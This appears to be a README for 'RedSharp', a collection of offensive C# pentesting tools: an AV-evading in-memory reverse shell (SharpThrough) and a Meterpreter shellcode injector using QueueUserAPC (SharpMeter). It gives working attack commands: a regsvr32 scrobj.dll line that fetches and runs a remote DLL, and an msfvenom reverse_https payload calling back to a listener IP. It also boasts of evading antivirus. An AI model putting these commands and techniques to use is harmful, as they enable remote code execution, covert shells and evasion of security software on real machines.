# RedSharp
random C# tools and scripts for Pentesting and offensive stuff

## SharpThrough
Simple yet effective C# reverse shell, at the moment can bypass many (maybe all) AVs  
Simple technique is used -> it compiles code in memory  
IDE VS 2015 , csproj is available. Compile platform choiche is yours: suggested is x64  
You can also compile it with :  
```
Usage:
C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library Program.cs
./DotNetToJScript.exe -c SharpThrough.RS -o test.dll -u Program.dll
regsvr32 /n /s /u /i:http://server/test.dll scrobj.dll
```

## SharpMeter
Executing Meterpreter generated shellcode via QueueUserAPC:  
(create a new process, "cmd.exe" in this case, injects and executes shellcode in process memory).  
First, generate your Meterpreter payload in C# format, like this :  
```msfvenom -a x64 -p windows/x64/meterpreter/reverse_https  lhost=10.200.3.163 lport=443 -f csharp -o pay.txt```  
Watch out to your architecture choice! x64 payload will only work with x64 executable version of sharpmeter.  
Do not touch generated payload format (not even the variable name)! Leave it as it is.
```
Usage :
sharpmeter.exe PATH_TO_PAYLOAD

Setup your Meterpreter handler + payload listener on the attacking machine
```
An example payload (x64 format) is attached inside the project. IDE VS 2015, csproj is available.  
This program is capable of running ANY shellcode but you need to be aware of shellcode format; it has to be in "meterpreter" format, so you may eventually convert it (but it's an easy task)

https://www.virustotal.com/#/file/12835ae086001626776b4ea0ce68035e2cd46c1924cb83bbe4ae7d5f615001ce/detection
